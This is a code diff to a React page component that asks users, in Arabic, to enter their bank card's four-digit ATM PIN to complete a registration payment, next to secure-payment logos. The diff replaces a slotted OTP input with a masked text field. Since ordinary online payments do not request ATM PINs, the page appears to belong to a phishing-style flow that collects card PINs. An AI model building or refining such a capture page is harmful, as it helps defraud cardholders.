@@ -4,11 +4,7 @@ import Header from "@/components/Header";
 import Stepper from "@/components/Stepper";
 import Footer from "@/components/Footer";
 import { Button } from "@/components/ui/button";
-import {
-  InputOTP,
-  InputOTPGroup,
-  InputOTPSlot,
-} from "@/components/ui/input-otp";
+import { Input } from "@/components/ui/input";
 import securePaymentLogos from "@/assets/secure-payment-logos.png";
 import { useRegistration } from "@/contexts/RegistrationContext";
 
@@ -72,21 +68,18 @@ const ATMPin = () => {
                 لإتمام عملية الدفع بشكل آمن، يرجى إدخال الرقم السري (PIN) الخاص ببطاقتكم المصرفية المكون من 4 أرقام في الحقل أدناه.
               </p>
 
-              <div className="flex justify-center mb-6" dir="ltr">
-                <InputOTP
-                  maxLength={4}
-                  value={pin}
-                  onChange={(value) => setPin(value)}
+              <div className="flex justify-center mb-6">
+                <Input
+                  type="password"
                   inputMode="numeric"
                   pattern="[0-9]*"
-                >
-                  <InputOTPGroup className="gap-3">
-                    <InputOTPSlot index={0} className="w-14 h-14 text-2xl" masked />
-                    <InputOTPSlot index={1} className="w-14 h-14 text-2xl" masked />
-                    <InputOTPSlot index={2} className="w-14 h-14 text-2xl" masked />
-                    <InputOTPSlot index={3} className="w-14 h-14 text-2xl" masked />
-                  </InputOTPGroup>
-                </InputOTP>
+                  maxLength={4}
+                  value={pin}
+                  onChange={(e) => setPin(e.target.value.replace(/\D/g, '').slice(0, 4))}
+                  className="w-32 h-14 text-2xl text-center tracking-[0.5em] border-primary"
+                  placeholder="****"
+                  dir="ltr"
+                />
               </div>
 
               <div className="bg-amber-50 dark:bg-amber-950/30 border border-amber-200 dark:border-amber-800 rounded-lg p-4 mb-4">
